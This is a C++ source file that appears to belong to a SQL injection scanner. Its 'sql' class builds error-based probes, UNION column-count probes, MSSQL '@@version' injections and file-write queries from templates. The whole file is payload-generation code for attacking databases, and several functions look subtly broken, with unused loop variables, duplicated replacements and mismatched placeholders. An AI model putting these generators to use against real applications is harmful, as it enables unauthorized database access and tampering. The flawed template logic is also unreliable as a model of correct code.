#include "pch.h"
#include "sql.h"

sql::sql() {
}

void sql::query_error() {
	for (auto g : this->generic_) {
		boost::regex r = boost::regex{"GENERIC+"};
		string qgeneric = boost::regex_replace(to_string(this->error_template), r, "");
		for (auto s : this->spaces) {
			r = boost::regex{"SPACE+"};
			string qspacex = boost::regex_replace(qgeneric, r, s);
			r = boost::regex{"SPACE+"};
			string qspace = boost::regex_replace(qspacex, r, s);
			r = boost::regex{"NUMBER+"};
			string qerroriden = boost::regex_replace(qspace, r, "(0x" + to_string(this->error_template) + ")");
			this->query_error_.push_back(qerroriden);
		}
	}
}

void sql::query_union(int max) {
	string q = this->union_template;
	for (auto g : this->generic_) {
		boost::regex r{"GENERIC+"};
		string qgeneric = boost::regex_replace(q, r, to_string(g));
		for (auto s : this->spaces) {
			r = boost::regex{"SPACE+"};
			string qspace = boost::regex_replace(qgeneric, r, s);
			string unionnumber = "";
			string unioniden = "";
			for (int i = 0; i < max;i++) {
				string newiden = this->identity + to_string(i) + this->identity;
				if (i == 0) {
					string newunionnumber = unionnumber + "(" + to_string(i) + ")";
					unionnumber = newunionnumber;
					string newunioniden = unioniden + "(0x" + newiden + ")";
					unioniden = newunioniden;
				}
				else {
					string newunionnumber = unionnumber + ",("+to_string(i) + ")";
					unionnumber = newunionnumber;
					string newunioniden = unioniden + ",(0x"+newiden+")";
					unioniden = newunioniden;
				}
				r = boost::regex{"NUMBER+"};
				string qunioniden = boost::regex_replace(unioniden, r, qspace);
				r = boost::regex{"NUMBER+"};
				string qunionnumber = boost::regex_replace(unionnumber, r, qspace);
				this->query_union_.push_back(qunioniden + "|" + qunionnumber);
			}
		}
	}
}

void sql::query_mssql() {
	string l = "2GENERIC";
	for (auto g : this->generic_) {
		boost::regex r{"GENERIC+"};
		string qgeneric = boost::regex_replace(l, r, g);
		this->query_mssql_.push_back(qgeneric);
		r = boost::regex{"GENERIC+"};
		string qgenericand = boost::regex_replace(l, r, " and 1=@@version--");
		this->query_mssql_.push_back(qgenericand);
		r = boost::regex{"GENERIC+"};
		string qgenericor = boost::regex_replace(l, r, " or 1=@@version--");
		this->query_mssql_.push_back(qgenericor);
	}
}

void sql::query_write() {
	for (auto w : this->writes) {
		for (auto g : this->generic_) {
			boost::regex r{"GENERIC+"};
			string qgeneric = boost::regex_replace(to_string(this->write_template), r, g);
			for (auto s : this->spaces) {
				r = boost::regex{ "NUMBER+" };
				string qspacex = boost::regex_replace(qgeneric, r, s);
				r = boost::regex{"SPACE+"};
				string qspace = boost::regex_replace(qspacex, r, s);
				r = boost::regex{"NUMBER+"};
				string qiden = boost::regex_replace(qspace, r, w);
				this->query_write_.push_back(qiden);
			}
		}
	}
}
